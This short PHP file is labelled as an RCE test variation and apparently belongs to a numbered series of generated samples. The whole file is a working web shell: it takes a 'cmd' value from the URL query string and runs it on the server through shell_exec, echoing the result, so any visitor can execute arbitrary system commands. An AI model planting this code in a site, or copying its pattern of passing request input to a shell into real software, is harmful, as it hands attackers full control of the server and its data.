<?php
// RCE test variation #917
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>